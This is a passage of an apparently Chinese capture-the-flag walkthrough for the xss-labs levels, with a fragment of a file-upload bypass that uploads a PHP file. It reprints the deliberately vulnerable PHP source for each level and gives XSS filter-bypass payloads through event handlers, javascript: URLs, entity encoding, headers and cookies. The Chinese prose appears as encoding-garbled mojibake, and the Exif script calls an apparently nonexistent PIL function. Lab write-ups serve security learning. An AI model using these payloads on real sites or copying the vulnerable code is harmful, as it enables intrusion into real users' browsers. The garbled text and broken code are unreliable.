æ­¤æˆ‘ä»¬å¯ä»¥è®©$fileä¸ºæ•°ç»„ã€‚ è®¾ç½®file[0]ä¸º1.php/.ï¼Œè€Œfile[2]è®¾ç½®ä¸ºjpgï¼ˆä¹Ÿå°±æ˜¯ç™½åå•ä¸­çš„æŸä¸€ä¸ªï¼‰file[1]ä¸ºç©ºï¼Œè¿™æ ·æœ€ç»ˆç»“æœä¸º åç¼€åä¸ºjpgï¼ˆç”±äºendå‡½æ•°çš„åˆ¤æ–­ï¼‰ï¼Œè€Œ$file[count($file) - 1]=$file[1]ä¸ºç©ºï¼Œfile_nameä¸º1.php/.ï¼Œç»è¿‡move_uploaded_file()çš„ç‰¹æ€§ï¼Œæœ€ç»ˆä¸Šä¼ ä¸º1.php ä¸Šä¼ æˆåŠŸ 0x03 Xss-lab level-1 &lt;title&gt;æ¬¢è¿æ¥åˆ°level1&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level1&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"name\"]; echo \"&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·\".$str.\"&lt;/h2&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; å¯ä»¥çœ‹åˆ°ä»£ç ä¼šæ¥å—ä¸€ä¸ªnameä¼ å‚ï¼Œä¸”å¯¹nameå†…å®¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥æ’å…¥jsä»£ç å³å¯ level-2 &lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level2&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=\"'.$str.'\"&gt; &lt;input type=submit name=submit value=\"æœç´¢\"/&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; ä»£ç å¯¹ä¼ å…¥keywordå‚æ•°ä½œäº†htmlspecialcharsçš„è¿‡æ»¤ï¼Œä½†æ˜¯åœ¨inputæ ‡ç­¾å¤„æ²¡æœ‰è®¾è®¡è¿‡æ»¤ï¼Œæˆ‘ä»¬åªéœ€è¦æ­£å¸¸é—­åˆæ’å…¥jsä»£ç å³å¯ \"&gt;&lt;script&gt;alert('hacker')&lt;/script&gt; level-3 &lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level3&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".\"&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword value='\".htmlspecialchars($str).\"'&gt; &lt;input type=submit name=submit value=æœç´¢ /&gt; &lt;/form&gt; &lt;/center&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; è¿™ä¸€å…³å¯¹inputä¸h2æ ‡ç­¾å¤„éƒ½åšäº†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œè½¬ä¹‰å­—ç¬¦å¦‚ä¸‹ï¼š æ³¨æ„è¿™é‡Œçš„å•å¼•å·ä¼¼ä¹æ˜¯ä¸è¢«è¿‡æ»¤çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨å³å¯ï¼Œé‚£ä¹‹åçš„æ€è·¯å°±æ˜¯æ‰¾ä¸€ä¸ªä¸éœ€è¦&lt;&gt;äº‹ä»¶æ ‡ç­¾ 1. 'onclick=alert('hacker')// 2. 'onfocus=javascript:alert('xss') &gt; // level-4 &lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level4&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str2=str_replace(\"&gt;\",\"\",$str); $str3=str_replace(\"&lt;\",\"\",$str2); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword value=\"'.$str3.'\"&gt; &lt;input type=submit name=submit value=æœç´¢ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str3).\"&lt;/h3&gt;\"; ?&gt; è¿™é‡Œè™½ç„¶å¯¹ä¼ å…¥çš„å‚æ•°è¿‡æ»¤äº†&lt;&gt;ï¼Œä½†æˆ‘ä»¬åªéœ€å€Ÿç”¨ä¸Šä¸€å…³çš„payloadå³å¯ã€‚ level-5 &lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level5&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword value=\"'.$str3.'\"&gt; &lt;input type=submit name=submit value=æœç´¢ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str3).\"&lt;/h3&gt;\"; ?&gt; è¿™é‡Œçœ‹åˆ°åœ¨inputæ ‡ç­¾å¤„ï¼Œåªæ˜¯é’ˆå¯¹å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä¸åŒ…å«ä¸Šè¿°å…³é”®è¯çš„payloadå³å¯ \"&gt;&lt;a href=javascript:alert('hacker')&gt;hacker&lt;/a&gt;// or \"&gt;&lt;a href=javascript:alert('hacker') // level-6 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword value=\"'.$str6.'\"&gt; &lt;input type=submit name=submit value=æœç´¢ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str6).\"&lt;/h3&gt;\"; ?&gt; ä¸ä¸Šä¸€å…³å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œå¢åŠ äº†è¿‡æ»¤hrefï¼Œdataå…³é”®è¯ç­‰ã€‚ä½†å´å¿˜è®°å¤§å°ç»•è¿‡äº†ã€‚ \" Onclick=alert('hacker') // or \"&gt;&lt;a Href=javascript:alert('hacker') // level-7 &lt;?php ini_set(\"display_errors\", 0); $str =strtolower( $_GET[\"keyword\"]); $str2=str_replace(\"script\",\"\",$str); $str3=str_replace(\"on\",\"\",$str2); $str4=str_replace(\"src\",\"\",$str3); $str5=str_replace(\"data\",\"\",$str4); $str6=str_replace(\"href\",\"\",$str5); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form action=level7.php method=GET&gt; &lt;input name=keyword value=\"'.$str6.'\"&gt; &lt;input type=submit name=submit value=æœç´¢ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str6).\"&lt;/h3&gt;\"; ?&gt; ä¸ä¸Šä¸€å…³æ¯”è¾ƒï¼Œè™½ç„¶é™åˆ¶äº†å¤§å°å†™çš„ç»•è¿‡ï¼Œä½†å¯¹äºå…³é”®è¯çš„è¿‡æ»¤é‡‡ç”¨çš„â€œæ›¿æ¢ä¸ºç©ºâ€è¿™æ„å‘³ç€æˆ‘ä»¬åŒå†™ç»•è¿‡å³å¯ \" oonnclick=alert('hacker') // or \"&gt;&lt;a hrhrefef=javascscriptript:alert('hacker') // level-8 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','&amp;quot',$str6); echo '&lt;center&gt; &lt;form action=level8.php method=GET&gt; &lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt; &lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str7).\"&lt;/h3&gt;\"; ?&gt; è™½ç„¶è¿™é‡Œè¿‡æ»¤çš„å¾ˆå…¨ï¼Œä½†æˆ‘ä»¬å…³æ³¨.$str7.å³å¯å‘ç°ï¼Œè¿™é‡Œå·²ç»ä¸ºæˆ‘ä»¬å†™å¥½hrefäº†ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•æ„é€ jsä»£ç å³å¯ã€‚ç”±äºåŒå¼•å·è¢«è¿‡æ»¤ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å†™å…¥çš„è‚¯å®šä¼šè¢«å½“åšå­—ç¬¦ä¸²ï¼Œä½†æˆ‘ä»¬æ­£å¥½å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼š åœ¨ HTML ä¸­ï¼Œå¯¹äº href å±æ€§ï¼Œæµè§ˆå™¨ä¼šå¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œè¿™æ„å‘³ç€ HTML å®ä½“ç¼–ç ä¼šåœ¨è§£æè¿‡ç¨‹ä¸­è¢«è¿˜åŸä¸ºåŸå§‹å­—ç¬¦ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ä½ æä¾›çš„ä¾‹å­ä¸­ï¼Œå³ä½¿æ’å…¥äº† HTML å®ä½“ç¼–ç ï¼Œæœ€ç»ˆä»ç„¶è¢«è§£é‡Šä¸º JavaScript ä»£ç çš„åŸå› ã€‚ é‚£æˆ‘ä»¬ç›´æ¥æ„é€ payloadå³å¯ javascript:alert('hacker') HTMLå®ä½“ç¼–ç å &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29; ä¹‹åè¾“å…¥åˆ°postè¾“å…¥æ¡†ä¸­å³å¯ level-9 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','&amp;quot',$str6); echo '&lt;center&gt; &lt;form action=level9.php method=GET&gt; &lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt; &lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;?php if(false===strpos($str7,'http://')) { echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'; } else { echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'; } ?&gt; &lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str7).\"&lt;/h3&gt;\"; ?&gt; javascript:alert('hacker')//http:// HTMLå®ä½“ç¼–ç å &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29;//http:// level-10 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str11 = $_GET[\"t_sort\"]; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; ç†Ÿæ‚‰çš„è¿‡æ»¤ï¼Œé‡ç‚¹å…³æ³¨t_sortå‚æ•°å³å¯ï¼Œè¿™é‡Œåœ¨ç»è¿‡ä¸¤ä¸ªç®€å•æ ¡éªŒä¹‹åå°±ç›´æ¥æ’å…¥åˆ°äº†inputäº‹ä»¶æ ‡ç­¾ä¸­ï¼Œç»•è¿‡åŸç†å¾ˆå®¹æ˜“çŸ¥é“ï¼Œä½†æ˜¯è¿™é‡Œçš„typeç¡®å®hiddenã€‚ æˆ‘ä»¬å¯ä»¥ç›´æ¥F12æ‰‹åŠ¨é™¤æ‰typeï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥payloadæ‰‹åŠ¨æ„é€  t_sort=\" type=\"\" onclick=alert('hacker')// level-11 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_SERVER['HTTP_REFERER']; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; è¿™é‡Œçš„keywordä¸t_sortéƒ½è¿›è¡Œäº†æœ‰æ•ˆè¿‡æ»¤ï¼Œä½†å…³æ³¨http_refererä¼šå‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥bpä¿®æ”¹å³å¯ ä¿®æ”¹refererå¤´å³å¯ level-12 &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_SERVER['HTTP_USER_AGENT']; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œåªä¸è¿‡æ³¨å…¥ç‚¹åœ¨uaå¤´ï¼Œä¸å†èµ˜è¿° level-13 &lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600); ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_COOKIE[\"user\"]; $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;'; ?&gt; &lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; ä¾æ—§è€å¥—è·¯ï¼Œæ³¨å…¥ç‚¹åœ¨cookieå¤„ level-14 è¿™é¢˜ç¯å¢ƒæœ‰é—®é¢˜ï¼Œå°±ç›´æ¥çœ‹ç½‘ä¸Šçš„æ€è·¯äº†ï¼šexif xss Exif XSS æ¼æ´æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå­˜åœ¨äºå›¾ç‰‡çš„ Exifï¼ˆExchangeable Image File Formatï¼‰æ•°æ®ä¸­ã€‚ Exif æ•°æ®æ˜¯åµŒå…¥åœ¨æ•°å­—å›¾åƒæ–‡ä»¶ä¸­çš„å…ƒæ•°æ®ï¼ŒåŒ…å«æœ‰å…³å›¾åƒçš„ä¿¡æ¯ï¼Œå¦‚æ‹æ‘„æ—¥æœŸã€ç›¸æœºå‹å·ã€GPS åæ ‡ç­‰ã€‚æµè§ˆå™¨å’Œå…¶ä»–åº”ç”¨ç¨‹åºé€šå¸¸ä¼šè§£æå’Œæ˜¾ç¤ºè¿™äº›æ•°æ®ã€‚ å½“å­˜åœ¨ Exif XSS æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒçš„ Exif æ•°æ®ä¸­æ’å…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·åŠ è½½å¸¦æœ‰æ¶æ„ Exif æ•°æ®çš„å›¾åƒæ—¶ï¼Œæµè§ˆå™¨æˆ–å…¶ä»–åº”ç”¨ç¨‹åºå¯èƒ½ä¼šé”™è¯¯åœ°è§£ææ¶æ„ä»£ç ï¼Œå¹¶åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œå®ƒã€‚ è„šæœ¬å¦‚ä¸‹ï¼š import PIL.ExifTags as ExifTags from PIL import Image # æ‰“å¼€å›¾åƒæ–‡ä»¶ image = Image.open('åˆå§‹.jpg') # è·å–å›¾åƒçš„ Exif æ•°æ® exif_data = image._getexif() # å°† Exif æ•°æ®è½¬ä¸ºå¯ä¿®æ”¹çš„å­—å…¸æ ¼å¼ exif_dict = dict(exif_data) # ä¿®æ”¹ Exif æ•°æ® exif_dict[ExifTags.TAGS['Make']] = 'xssè¯­å¥' exif_dict[ExifTags.TAGS['Model']] = 'xssè¯­å¥' # å°†ä¿®æ”¹åçš„ Exif æ•°æ®é‡æ–°å†™å›å›¾åƒ exif_bytes = ExifTags.exif_dict_to_bytes(exif_dict) image.save('æ”¹å.jpg', exif=exif_bytes) ä¹‹åæ€è·¯å°±æ˜¯å…ˆä¿®æ”¹iframeæ ‡ç­¾ï¼Œæ¥ç€ä¸Šä¼ å›¾ç‰‡åŠ è½½å³å¯ï¼Œå…·ä½“å¯å‚è€ƒï¼š [ç½‘ç»œå®‰å…¨]xss-labs level-14 è§£é¢˜è¯¦æ level-15 &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"&gt;&lt;/script&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"src\"]; echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;'; ?&gt; å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªng-includeå±æ€§ï¼Œæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹ è¿™é¢˜è€ƒå¯Ÿ Angular JS çš„ ng-include ç”¨æ³•ï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡èµ„æ–™ï¼šAngularJS ng-include æŒ‡ä»¤ ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ï¼ŒåŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚æ‰€ä»¥è¿™é‡Œå°±ç”¨æ¥åŒ…å«å…¶ä»–å…³çš„é¡µé¢æ¥è§¦å‘å¼¹çª—ã€‚ level14.php?src=\"level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;\" ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š 1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å· 2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ 3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ« level-16 &lt;?php ini_set(\"display_errors\", 0); $str = strtolower($_GET[\"keyword\"]); $str2=str_replace(\"script\",\"&amp;nbsp;\",$str); $str3=str_replace(\" \",\"&amp;nbsp;\",$str2); $str4=str_replace(\"/\",\"&amp;nbsp;\",$str3); $str5=str_replace(\"\t\",\"&amp;nbsp;\",$str4); echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:\".strlen($str5).\"&lt;/h3&gt;\"; ?&gt; è¿™é‡Œè¿‡æ»¤æ‰äº† script æ ‡ç­¾ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨å…¶ä»–æ ‡ç­¾é€šè¿‡äº‹ä»¶æ¥å¼¹çª—ï¼Œä½†æ˜¯ä¹Ÿè¿‡æ»¤äº†ç©ºæ ¼ã€‚ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç¬¦å·æ›¿ä»£ç©ºæ ¼ ç¬¦å· URL ç¼–ç  å›è½¦ (CR) %0d æ¢è¡Œ (LF) %0a &lt;img%0Asrc=â€111â€%0Aonerror=alert('xss')&gt; &lt;img%0Asrc=\"1\"%0Aonmouseover=\"alert(1)\"&gt; level-17 &lt;?php ini_set(\"display_errors\", 0); echo \"&lt;embed src=index.png?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\"; ?&gt; æ€»çš„æ¥è¯´&lt;embed&gt;æ ‡ç­¾å°±æ˜¯å¼•å…¥ä¸€ä¸ªswfæ–‡ä»¶åˆ°æµè§ˆå™¨ç«¯ï¼Œå¹¶ä¸”å®ƒçš„srcå±æ€§å€¼æ²¡æœ‰æ·»åŠ å¼•å·ï¼Œæ‰€ä»¥ä¸ç”¨é—­åˆï¼Œä½†è¿™é‡Œéœ€è¦ç”¨æ”¯æŒflashæ’ä»¶çš„æµè§ˆå™¨æ‰å¯ä»¥å›æ˜¾swfåŒºåŸŸï¼Œå¤§å®¶å¯ä»¥ä¸‹è½½ï¼Œæˆ–è€…å»åå°ä¿®æ”¹å¼•å…¥çš„æ–‡ä»¶å¦‚ï¼šindex.pngï¼Œå¦‚ä¸‹å›¾ onmouseover=alert(1) level-18 &lt;?php ini_set(\"display_errors\", 0); echo \"&lt;embed src=index.png?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\"; ?&gt; æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œç”¨ä¸Šä¸€å…³çš„payloadå³å¯ level-19 &lt;?php ini_set(\"display_errors\", 0); echo '&lt;embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;'; ?&gt; è·Ÿå‰å‡ å…³å·®ä¸å¤šï¼Œä½†srcåŠ äº†åŒå¼•å·æ¥é—­åˆï¼Œä½†å¾ˆæ˜æ˜¾æœ‰HTMLå®ä½“åŒ–å‡½æ•°ï¼Œæˆ‘ä»¬æ— æ³•é—­åˆåŒå¼•å·ï¼Œå‚è€ƒLevel 19 Flash XSSä¸Flash XSS æ¼æ´è¯¦è§£ Flash XSSï¼ˆCross-Site Scriptingï¼‰æ˜¯æŒ‡é’ˆå¯¹ä½¿ç”¨Adobe FlashæŠ€æœ¯å¼€å‘çš„åº”ç”¨ç¨‹åºçš„è·¨ç«™è„šæœ¬æ”»å‡»ã€‚ Flashæ˜¯ä¸€ç§ç”¨äºåˆ›å»ºå¯Œåª’ä½“å’Œäº’åŠ¨å†…å®¹çš„å¹¿æ³›ä½¿ç”¨çš„æŠ€æœ¯ï¼Œå°†æ¶æ„Flashæ–‡ä»¶åµŒå…¥åˆ°å—ä¿¡ä»»çš„ç½‘é¡µä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„Flashæ–‡ä»¶çš„é¡µé¢æ—¶ï¼ŒFlashæ–‡ä»¶ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚ è¿™å…³ç”¨åˆ°çš„æ˜¯Flash Xssæ³¨å…¥,å…¶å®å°±æ˜¯å¾€Flashé‡Œé¢æ’å…¥ä¸€æ®µjsä»£ç 